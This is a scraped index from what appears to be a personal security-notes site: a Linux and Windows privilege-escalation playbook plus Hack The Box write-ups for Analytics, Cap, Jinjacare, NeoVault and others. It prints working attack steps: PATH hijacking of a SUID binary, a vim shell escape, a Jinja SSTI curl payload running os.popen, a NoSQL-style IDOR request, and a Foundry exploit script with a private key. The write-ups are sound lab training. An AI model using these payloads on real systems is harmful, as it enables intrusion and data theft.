JAVA_VERSION=jdk-11.0.19+7 _=/usr/bin/env OLDPWD=/   ","version":"Next","tagName":"h3"},{"title":"Privilege escalation​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#privilege-escalation","content":" This step is gaining access to the root or Administrator user of the machine. Once we do that, we can do whatever we want with that machine. The topic is very broad and this section only provides a summary of things to watch out.  ","version":"Next","tagName":"h2"},{"title":"Windows​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#windows","content":" You can use https://github.com/carlospolop/PEASS-ng. You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to exploit and gain admin access.  It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to ConsoleHost_history.txt file.  Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run icacls command. (F) means Full access and is a promising way of privilege escalation.  ","version":"Next","tagName":"h3"},{"title":"Linux​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#linux","content":" Hidden files​  Once you got foothold to a server and if you need to perform lateral movement or privilege escalation, most of the times, there will be some hidden configuration file worth exploring. Remember to set the flags to ls to check the hidden files:  ls -lisa   Check accessible folders​  Check what's in the following directories:  /home/user/var/xxxx/etc/xxx  e.g. in Artificial machine, there was an accessible file in /var/logs which was the key to resolve the machine.  Sudo​  You can check if the user can run sudo command and with which privileges or restrictions by running:  jack@clicker:~$ sudo -l Matching Defaults entries for jack on clicker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jack may run the following commands on clicker: (ALL : ALL) ALL (root) SETENV: NOPASSWD: /opt/monitor.sh   NOPASSWD: means the user can execute the program without password as root.SETENV: means the user can set environment variables running the program as root.  SUID​  If you see some entry that allows the user to execute a binary as superuser you can check the file flags and permissions by running:  ls -lisa /usr/bin/bugtracker 264151 12 -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker   The 's' in the result is the sticky bit in the file permissions.  file /usr/bin/bugtracker /usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped   The setuid permission is the sticky bit representation in the file command output.  That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.  In our case, the binary 'bugtracker' is owned by root &amp; we can execute it as root since it has SUID set.  If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it's using cat command:  robert@oopsie:/var/www/html$ bugtracker 12 bugtracker 12 ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 12 12 --------------- cat: /root/reports/12: No such file or directory   Looks like it's not using the full path of the cat tool. We can create a executable named cat and put it before in PATH and it will execute that cat (/tmp/cat) instead of the real cat:  echo &quot;/bin/sh&quot; &gt; /tmp/cat robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH robert@oopsie:/var/www/html$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games robert@oopsie:/var/www/html$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 12 12 --------------- whoami root   and we have root access.  You can try to find all the files that has the suid flag set:  find / -perm -u=s -type f 2&gt;/dev/null   GTFObins​  If sudo -l shows permission for any binary, check https://gtfobins.github.io for a way to exploit the binary to gain root access.  E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:  vi :set shell=/bin/sh :shell   Check write access to PATH​  Check if you can write to some path in the PATH variable  import os paths = os.environ[&quot;PATH&quot;].split(&quot;:&quot;) for path in paths: writetable=True filename=f&quot;{path}/a&quot; try: with open(filename, &quot;w&quot;) as file1: file1.write(&quot;Hello&quot;) except Exception: writetable=False if writetable: os.system(f&quot;rm {filename}&quot;) print(path +&quot; ... &quot;+str(writetable))   Check open ports​  Might be interesting to what ports are listening in the server, you might find something vulnerable listening only in localhost for example.  netstat -tunap |grep &quot;LISTEN&quot;   Kernel version​  Search OS version and kernel for CVEs:  uname -a Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux   If we look in Google for 6.2.0-25-generic #25~22.04.2-Ubuntu CVE you'll see this link: https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability and this link https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629  Sudo version​  Check the sudo version. Sometimes the sudo tool itself has some vulnerability that leads to privilege escalation. ","version":"Next","tagName":"h3"},{"title":"Survival of the fittest","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/survival-of-the-fittest","content":"Survival of the fittest https://app.hackthebox.com/challenges/Survival%2520of%2520the%2520Fittest Alex had always dreamed of becoming a warrior, but she wasn't particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster. This is very similar to Distrack And Destroy challenge. It's a blockchain challenge where you need to set the balance of the creature to zero to solve it. The script is really simple, just define the interface or the creature, call the attack function and then loot: // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import &quot;forge-std/Script.sol&quot;; interface ICreature { function strongAttack(uint256 _damage) external; function loot() external; } contract Exploit is Script { uint256 constant PRIVATE_KEY = 0x85326f106a23ac84cf6be593ed479aeeed9e0fadaaf9497fea203c406888eead; address constant PLAYER_ADDRESS = 0x5D612DA7e8aC61beB2457b53b5f438264E086a5d; address constant CREATURE_ADDRESS = 0x17D8DdE823914C2423c9997b40c226114e14EC53; address constant SETUP_ADDRESS = 0x98B20fE76986B32Eeb7c77D554Edb6f2a9978919; function run() external { // Start broadcasting from player's EOA private key vm.startBroadcast(PRIVATE_KEY); ICreature creature = ICreature(CREATURE_ADDRESS); // Step 1: Strong attack to remove all life points creature.strongAttack(20); // Step 2: Loot creature.loot(); vm.stopBroadcast(); } } And call it with forge: forge script Exploit.s.sol:Exploit --rpc-url http://94.237.51.157:58017/rpc --broadcast Then in the website in other blockchain challenge, when you click attack, the flag was revealed when the condition is met. However, this is not the case. Checking the source code, the button just does some css non-sense, nothing related with the flag. However, there's a flag function defined. We just need to call it from the Brwoser developer console and that's it.","keywords":"","version":"Next"},{"title":"The last dance","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/the-last-dance","content":"The last dance https://app.hackthebox.com/challenges/The%2520Last%2520Dance To be accepted into the upper class of the Berford Empire, you had to attend the annual Cha-Cha Ball at the High Court. Little did you know that among the many aristocrats invited, you would find a burned enemy spy. Your goal quickly became to capture him, which you succeeded in doing after putting something in his drink. Many hours passed in your agency's interrogation room, and you eventually learned important information about the enemy agency's secret communications. Can you use what you learned to decrypt the rest of the messages? We are given two files: out.txtsource.py After reading the source code, we know the contents of out.txt: Initialization vectorEncrypted messageEncrypted flag The encryption is ChaCha20 ChaCha20 is a stream cipher, meaning it encrypts data by XORing the plaintext with a keystream derived from: A keyA nonce/IVA counter (which increments for each block) The keystream is deterministic and only depends on the key and IV (and counter), not the plaintext. So if the same key and IV are reused, the same keystream is reused. In order to retriev the flag, we'lll do the following: Derive the keystream from the encrypted message by doing: keystream = encrypted message XOR plaintext Extract the flag by doing: flag = keystream XOR encrypted flag Remember that for XOR both inputs need to be of the same size!","keywords":"","version":"Next"},{"title":"Analytics","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/analytics","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Analytics","url":"/docs/write-up/htb/machines/easy/analytics#enumeration","content":" nmap 10.10.11.233 -A -oA machines/analytics/enumeration/scans/all-ports -p- --min-rate 1000   Shows ports 22 and 80.  SSH version looks quite recent, let's focus on port 80:  http://analytical.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@analytical.com,due@analytical.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.233], JQuery[3.0.0], Script, Title[Analytical], X-UA-Compatible[IE=edge], nginx[1.18.0]   Checking the website, I see a Login section that redirects to another subdomain: data.analytical.htb. Let's add it to the /etc/hosts. It shows the login page of Metabase, let's try some default credentials.  The metabase version looks like it's v0.46.6.  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Analytics","url":"/docs/write-up/htb/machines/easy/analytics#foothold","content":" Found a POC for this precise version: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/  With the payload in the description and modifying it with our local IP,port we got foothold!  e4396eead2c0:/$ id id uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)   However, we cannot see any relevant users:  e4396eead2c0:~$ cat /etc/passwd|grep &quot;home&quot; cat /etc/passwd|grep &quot;home&quot; metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash   In that /home/metabase folder there's nothing and we see it's using /bin/ash, there's a high chance this is running inside a docker container. We'll need to investigate how to bypass it.  Right now we have access to the docker container, but we cannot exit it.  We can exfil the database which looks like a H2 instance.  We can check the environment variables:  5d711b9d670a:/metabase.db$ env env SHELL=/bin/sh MB_DB_PASS= HOSTNAME=5d711b9d670a LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/metabase.db LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_dsXXXX# MB_EMAIL_SMTP_PASSWORD= USER=metabase SHLVL=4 MB_DB_USER= FC_LANG=en-US LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib LC_CTYPE=en_US.UTF-8 MB_LDAP_BIND_DN= LC_ALL=en_US.UTF-8 MB_LDAP_PASSWORD= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_CONNECTION_URI= JAVA_VERSION=jdk-11.0.19+7 _=/usr/bin/env OLDPWD=/   We tried to use the user/password in env var and boom, we got user access.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Analytics","url":"/docs/write-up/htb/machines/easy/analytics#privilege-escalation","content":" Search OS version and kernel for CVEs:  uname -a Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux   If we look in Google for 6.2.0-25-generic #25~22.04.2-Ubuntu CVE you'll see this link: https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability and this link https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629  Now it's just a matter of cloning the repo and run the exploit and you get root access directly and pwned! ","version":"Next","tagName":"h2"},{"title":"Evaluative","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/evaluative","content":"Evaluative https://app.hackthebox.com/challenges/Evaluative A rogue bot is malfunctioning, generating cryptic sequences that control secure data vaults. Your task? Decode its logic and compute the correct output before the system locks you out! This was a weird one. It was more like a programming challenge than a hacking challenge. At the beginning, looks like it was a very easy RCE since we got a Python console. However, after searching for the flag inside the docker container, I couldn't find anything so I switched to analyze the source code. In the source code I found an interesting line: check = requests.post(f'{CHECK_SERVER}/check', json=response).json() first_item = next(iter(results.items())) if check['success']: return jsonify({ 'flag': check['flag'], 'stderr': '', 'input': first_item[0], 'result': first_item[-1] }) Looks like if we got the assignment programmed correctly, we'll retrieve the flag. Extremely easy","keywords":"","version":"Next"},{"title":"Flag command","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/flag-command","content":"Flag command https://app.hackthebox.com/challenges/Flag%20Command Embark on the &quot;Dimensional Escape Quest&quot; where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape! We're given an IP and port, this is some sort of a web role game. We can inspect the JS code to see the correct decission we need to take. There are three files: commands.js: The definition of the commands, there's the GAME_WON command which probably will reveal the flag.game.jsmain.js In main.js we see calls to an API. The response to display the possible commands is this: { &quot;allPossibleCommands&quot;: { &quot;1&quot;: [ &quot;HEAD NORTH&quot;, &quot;HEAD WEST&quot;, &quot;HEAD EAST&quot;, &quot;HEAD SOUTH&quot; ], &quot;2&quot;: [ &quot;GO DEEPER INTO THE FOREST&quot;, &quot;FOLLOW A MYSTERIOUS PATH&quot;, &quot;CLIMB A TREE&quot;, &quot;TURN BACK&quot; ], &quot;3&quot;: [ &quot;EXPLORE A CAVE&quot;, &quot;CROSS A RICKETY BRIDGE&quot;, &quot;FOLLOW A GLOWING BUTTERFLY&quot;, &quot;SET UP CAMP&quot; ], &quot;4&quot;: [ &quot;ENTER A MAGICAL PORTAL&quot;, &quot;SWIM ACROSS A MYSTERIOUS LAKE&quot;, &quot;FOLLOW A SINGING SQUIRREL&quot;, &quot;BUILD A RAFT AND SAIL DOWNSTREAM&quot; ], &quot;secret&quot;: [ &quot;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&quot; ] } } Using Firefox developer tools, we can place a breakpoint in the CheckMessage function which is only called when the game is started. In the CheckMessage there's this line: if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) { If we provide the secret, the frontend will make the call to the API and it will return the secret! Easy!","keywords":"","version":"Next"},{"title":"Jinjacare","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/jinjacare","content":"","keywords":"","version":"Next"},{"title":"Recon​","type":1,"pageTitle":"Jinjacare","url":"/docs/write-up/htb/challenges/jinjacare#recon","content":" └─$ whatweb http://94.237.54.192:47055/http://94.237.54.192:47055/ [200 OK] Country[FINLAND][FI], Email[info@jinjacare.com], HTML5, HTTPServer[nginx/1.22.1], IP[94.237.54.192], Script, Title[JinjaCare - Home], nginx[1.22.1]  The source code is not bundled, so we can take a look.  Non-logged user interactions:  LoginRegisterVerify certificate  Logged interactions:  Download certificateUpdate personal infoAdd record to medical historyAdd vaccination record  The downloaded certificate has a QR worth exploring... it has the URL to verify the certificate. When verifying the certificate, we get:  Certificate is valid Name: Test test Issue Date: 2025-08-02 Status: Valid Certificate ID: 4b7c8a77-1d21-43b8-9f95-cdd81ca988fc   So, it's a way of exposing data, we would need to have the certificate ID.  Regarding the session cookie:  The value is a signed, URL-safe, possibly zlib-compressed Base64-encoded token.  Likely generated using Python’s itsdangerous or Django/Flask session management.  You need the secret key to decode it completely and safely.  from itsdangerous import URLSafeTimedSerializer # Substitute with your actual secret key secret_key = 'secret' serializer = URLSafeTimedSerializer(secret_key) decoded = serializer.loads('eJwlzjEOwzAIQNG7eO4AiTGQy0SAQe2aNFPVuzdS168_vE_b68jz2bb3ceWj7a_ZtjZmp3DsOBkkhkSl5VAJWZJMGbSjswMOMcNl8P2WrhVlQHK3FE21hI6dNdhUXIdBiWDmuroRYWQJBc8FlHGCeDoPZSq0dkOuM4-_Btv3B9TaL5E.aI3PQw.13X6VlkbhdbnEyvL-flGMof2DX4') print(decoded)   With burp suite, we see the session cookie changes from  Cookie: session=.eJwlzjEOwzAIQNG7eO4AiTGQy0SAQe2aNFPVuzdS168_vE_b68jz2bb3ceWj7a_ZtjZmp3DsOBkkhkSl5VAJWZJMGbSjswMOMcNl8P2WrhVlQHK3FE21hI6dNdhUXIdBiWDmuroRYWQJBc8FlHGCeDoPZSq0dkOuM4-_Btv3B9TaL5E.aI3PQw.13X6VlkbhdbnEyvL-flGMof2DX4   to  Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.aI3UXA.CYoLW8CfalTCefLOSG2huGM7ptg   With base64 decode, we got:  {&quot;_fresh&quot;: false}   Maybe we can copy the contents of this cookie, to get acess to the dashboard.  Most likely, we'll need to get a way to retrieve a UUID and then call the verify  Doing directory bruteforce, we can find an interesting directory: console. Looks like it's a Console // Werkzeug Debugger  which asks for a PIN. We can compute this PIN, but will need access to the machine itself.  The output is reflected in the generated PDF, we might be able to inject some malicious payload in the Full Name field.  ","version":"Next","tagName":"h2"},{"title":"SSTI​","type":1,"pageTitle":"Jinjacare","url":"/docs/write-up/htb/challenges/jinjacare#ssti","content":" From the downloaded PDF, we can see that is generate with whhtmltopdf. Looks like we can break PDF Generation using { char. When the full name is set to {{{{{ the PDF generation breaks with :  Error generating certificate: unexpected '&lt;'   or with another payload:  &lt;iframe src=”file:///etc/passwd” height=”500” width=”500”&gt;   the error is:  Error generating certificate: wkhtmltopdf reported an error: The switch --no-outline, is not support using unpatched qt, and will be ignored.QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root' Exit with code 1 due to network error: ContentNotFoundError   which looks like the output of the command, so we have command injection vulnerability here.  However, judging by the name of the challenge, we might be lucky to have simple Jinja template injection on the Full Name field  Call to update the profile  curl 'http://94.237.50.221:34050/profile/personal' \\ -X POST \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \\ -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \\ -H 'Accept-Language: en-US,en;q=0.5' \\ -H 'Accept-Encoding: gzip, deflate' \\ -H 'Content-Type: application/x-www-form-urlencoded' \\ -H 'Origin: http://94.237.50.221:34050' \\ -H 'Connection: keep-alive' \\ -H 'Referer: http://94.237.50.221:34050/profile/personal' \\ -H 'Cookie: session=.eJwlzjEOwzAIQNG7eO6AMWCSy0TYgNrVaaaqd2-krn_4ep9y5IrzWfb3uuJRjpeXvWDOHg2yq5s7NNbNqNuksF5RqhCYskSISAuoxA3gDjpy-KYcc7RqW-1pg6cPYk3MRoDzHtJIlB6oShpmJonMYSToiiKjZrkh1xnrr6nl-wPM4y-d.aI9hZw.09HnWSM3dAKtNpbgpOxn0tUS9C8' \\ -H 'Upgrade-Insecure-Requests: 1' \\ -H 'Priority: u=0, i' \\ --data-raw 'name={{2*2}}&amp;email=test%40test.htb&amp;phone=None&amp;address=None&amp;dateOfBirth=2025-08-05&amp;gender=male&amp;emergencyName=None&amp;emergencyPhone=None&amp;relationship=None'   In the PDF we can see the number 4 reflected, so looks like we have simple template injection working. No need to try to break whtmltopdf to explot the command injection.  According to https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection, the next thing is identify the templating engine, if you look at the tittle of change, there are high chances we're dealing with Jinja templating engine.  We can use SSTI to read the files in the server, and we see there's a flag.txt  curl 'http://94.237.50.221:34050/profile/personal' \\ -X POST \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \\ -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \\ -H 'Accept-Language: en-US,en;q=0.5' \\ -H 'Accept-Encoding: gzip, deflate' \\ -H 'Content-Type: application/x-www-form-urlencoded' \\ -H 'Origin: http://94.237.50.221:34050' \\ -H 'Connection: keep-alive' \\ -H 'Referer: http://94.237.50.221:34050/profile/personal' \\ -H 'Cookie: session=.eJwlzjEOwzAIQNG7eO6AMWCSy0TYgNrVaaaqd2-krn_4ep9y5IrzWfb3uuJRjpeXvWDOHg2yq5s7NNbNqNuksF5RqhCYskSISAuoxA3gDjpy-KYcc7RqW-1pg6cPYk3MRoDzHtJIlB6oShpmJonMYSToiiKjZrkh1xnrr6nl-wPM4y-d.aI9hZw.09HnWSM3dAKtNpbgpOxn0tUS9C8' \\ -H 'Upgrade-Insecure-Requests: 1' \\ -H 'Priority: u=0, i' \\ --data-raw 'name={{config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;ls /&quot;).read()}}&amp;email=test%40test.htb&amp;phone=None&amp;address=None&amp;dateOfBirth=2025-08-05&amp;gender=male&amp;emergencyName=None&amp;emergencyPhone=None&amp;relationship=None'   And we got the flag! ","version":"Next","tagName":"h2"},{"title":"Like a glove","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/like-a-glove","content":"Like a glove https://app.hackthebox.com/challenges/Like%2520a%2520Glove Words carry semantic information. Similar to how people can infer meaning based on a word's context, AI can derive representations for words based on their context too! However, the kinds of meaning that a model uses may not match ours. We've found a pair of AIs speaking in metaphors that we can't make any sense of! The embedding model is glove-twitter-25. Note that the flag should be fully ASCII ans starts with 'htb{'. GloVe is an unsupervised learning algorithm for obtaining vector representations for words: https://nlp.stanford.edu/projects/glove/. An analogy can be expressed such as: A : B :: C : _?_ In order to compute the ?, we need to do: B - A + C e.g. : France : Paris :: Italy : _?_ You solve for: wv('France') - wv('Paris') + wv('Berlin') = target_coordinates I was a bit confused of what to do at this point, because there's the word flag in the corpus. However, when you resolve the analogy, it does not look like the format expected. Instead, what it needs to be done is resolve every analogy and the append every result into a word. That word will be the final flag. After doing that and strip and remove the spaces, we got something that looks like the flag, but still it's not. The numbers are adding some weird space. If you compute the unicode code of those chars, you see something weird: ０ =&gt; 65296 While for normal letters: Closest match for 'qualification' is 'rma' r =&gt; 114 m =&gt; 109 a =&gt; 97 It turns out that the ASCII table only arrives to code 127 (or 255 if extended). We're dealing with non-ASCII characters here. They are full-width digits, e.g.: https://www.codetable.net/decimal/65296 Luckily, we can normalize them quite easily: def normalize(text): return unicodedata.normalize('NFKC', text) Once we do that to our potential flag, we'll retrieve the correct flag.","keywords":"","version":"Next"},{"title":"Cap","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/cap","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Cap","url":"/docs/write-up/htb/machines/easy/cap#enumeration","content":" Let's do network enumeration with nmap:  └─$ nmap 10.10.10.245 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 22:56 CEST Nmap scan report for 10.10.10.245 Host is up (0.034s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds   FTP does not allow anonymous access  Whatweb reveals gunicorn server:  whatweb 10.10.10.245 http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Cap","url":"/docs/write-up/htb/machines/easy/cap#foothold","content":" Looks like in the download area, we can pass a parameter and it will us access to captures that are not ours:  http://10.10.10.245/data/0  and we can see the ftp password for nathan. Unfortunately for him, he reused the same password for SSH and we can get the flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Cap","url":"/docs/write-up/htb/machines/easy/cap#privilege-escalation","content":" Use linPEAS to search for possible privesc vectors  The output of linPEAS show:  Files with capabilities (limited to 50): /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip   python 3.8 has setuid capability, which will allow the process to set the userid. We can abuse this to set uid to 0 (root) and get a root shell and retrieve the root flag. ","version":"Next","tagName":"h2"},{"title":"NeoVault","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/neo-vault","content":"NeoVault https://app.hackthebox.com/challenges/NeoVault Neovault is a trusted banking app for fund transfers and downloading transaction history. You're invited to explore the app, find potential vulnerabilities, and uncover the hidden flag within. We are given access to an instance IP and port. The JS code is bundled with webpack. Let's analyze the app with whatweb: └─$ whatweb 94.237.54.192:34875 http://94.237.54.192:34875 [200 OK] Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.22.1], IP[94.237.54.192], PasswordField[password], Script, Title[NeoVault], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js], nginx[1.22.1] A webapp built with nextjs, bundled with webpack. No sourcemaps available This doesn't reveal much. The application does not show much option to interact with, there's only login and create an account. Let's do it! Checking the source code, looks like it's bundled with webpack, we can use prettier to &quot;deofuscate&quot; it: https://prettier.io/playground Checking the code we can find the backend endppoints: let a = { endpointsV1: { me: &quot;/api/v1/auth/me&quot;, login: &quot;/api/v1/auth/login&quot;, register: &quot;/api/v1/auth/register&quot;, logout: &quot;/api/v1/auth/logout&quot;, changeEmail: &quot;/api/v1/auth/change-email&quot;, transactions: &quot;/api/v1/transactions&quot;, deposit: &quot;/api/v1/transactions/deposit&quot;, balanceHistory: &quot;/api/v1/transactions/balance-history&quot;, categoryPercentages: &quot;/api/v1/transactions/categories-spending&quot;, downloadTransactions: &quot;/api/v1/transactions/download-transactions&quot;, }, endpointsV2: { me: &quot;/api/v2/auth/me&quot;, login: &quot;/api/v2/auth/login&quot;, register: &quot;/api/v2/auth/register&quot;, logout: &quot;/api/v2/auth/logout&quot;, changeEmail: &quot;/api/v2/auth/change-email&quot;, transactions: &quot;/api/v2/transactions&quot;, deposit: &quot;/api/v2/transactions/deposit&quot;, balanceHistory: &quot;/api/v2/transactions/balance-history&quot;, categoryPercentages: &quot;/api/v2/transactions/categories-spending&quot;, downloadTransactions: &quot;/api/v2/transactions/download-transactions&quot;, inquireUser: &quot;/api/v2/auth/inquire&quot;, }, Potentially the last endpoint allows us to enumerate the users. If we pay attention to the visible deposit, we can see it's coming from neo_system. If we call the inquie endpoint, we can see its id: {&quot;_id&quot;:&quot;688cf823d181feda936b9d54&quot;,&quot;username&quot;:&quot;neo_system&quot;} In the PDF download button, if we change from v2 to v1, we get the following message: {&quot;message&quot;:&quot;_id is not provided&quot;} which ressembles to MongoDB database error: https://stackoverflow.com/questions/24427845/can-not-find-a-record-by-its-id-in-mongodb curl 'http://94.237.61.242:59723/api/v1/transactions/download-transactions' \\ -H 'Accept: */*' \\ -H 'Accept-Language: en-US,en;q=0.9' \\ -H 'Content-Type: application/json' \\ -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OGNmOTI4ZDE4MWZlZGE5MzZiOWQ2MyIsImlhdCI6MTc1NDA3MDA2NywiZXhwIjoxNzU0MDczNjY3fQ.BfcX5Fsdizd99JwxO6sY5shQNLrdxq6iIpYkqP_cX-8' \\ -H 'Origin: http://94.237.61.242:59723' \\ -H 'Proxy-Connection: keep-alive' \\ -H 'Referer: http://94.237.61.242:59723/dashboard/transactions' \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \\ --data-raw '{&quot;_id&quot;:&quot;688cf823d181feda936b9d54&quot;,&quot;username&quot;:&quot;neo_system&quot;}' \\ --insecure And it works, we can see it made a deposit to a user named user_with_flag. Let's enquire the user: {&quot;_id&quot;:&quot;688cf823d181feda936b9d59&quot;,&quot;username&quot;:&quot;user_with_flag&quot;} and retrieve the transactions again for this user: curl 'http://94.237.61.242:59723/api/v1/transactions/download-transactions' \\ -H 'Accept: */*' \\ -H 'Accept-Language: en-US,en;q=0.9' \\ -H 'Content-Type: application/json' \\ -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OGNmOTI4ZDE4MWZlZGE5MzZiOWQ2MyIsImlhdCI6MTc1NDA3MDA2NywiZXhwIjoxNzU0MDczNjY3fQ.BfcX5Fsdizd99JwxO6sY5shQNLrdxq6iIpYkqP_cX-8' \\ -H 'Origin: http://94.237.61.242:59723' \\ -H 'Proxy-Connection: keep-alive' \\ -H 'Referer: http://94.237.61.242:59723/dashboard/transactions' \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \\ --data-raw '{&quot;_id&quot;:&quot;688cf823d181feda936b9d59&quot;,&quot;username&quot;:&quot;user_with_flag&quot;}' \\ --insecure And we can see the secret into the PDF","keywords":"","version":"Next"},{"title":"Simple Encryptor","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/simple-encryptor","content":"Simple Encryptor https://app.hackthebox.com/challenges/Simple%2520Encryptor On our regular checkups of our secret flag storage server we found out that we were hit by ransomware! The original flag data is nowhere to be found, but luckily we not only have the encrypted file but also the encryption program itself. We are given a binary file called encrypt and the file flag.enc We need to reverse the binary, the main function expects the file flag to be present, if it is it encrypts it with the algorithm and generate the flag.enc file. The first 4 bytes in the file and the 32-bit truncated system-time used for the encryption The next content in the content of flag file shifted somehow: -rw-rw-r-- 1 gal gal 11 Aug 16 15:10 flag -rw-rw-r-- 1 gal gal 15 Aug 16 15:10 flag.enc Whatever content you write in flag, flag.enc is the same size plus 4 bytes (32-bit truncated unix time) The next content is encrypted doing some bitwise operations: Computes a random integer, take the lowest 8 bits and do XOR with the byte at position iComputes another random integer restricted from 0 to 7.Perform left bitwise shift by the number determined by the random number. This is not standard bitwise shirt, in the standard operation the excess bit are lost, however here there are pushed through the start of the binaries. In order to so, first perform the standard bit shift and then perform the right bitwise shit of the excess bits (8-random number) and finally perform the bitwise OR of the two shifted values. It's easy to visualize in an example: In order to revert the encryption, first we need to be able to generate exactly the same sequence of random number. Since computers use pseudo-random number generators (PRNG) and we have the seed, we can generate exactly the same sequence of random number. But, there's one caveat: python and c uses different PRNG implementations. Having said that, the first starting 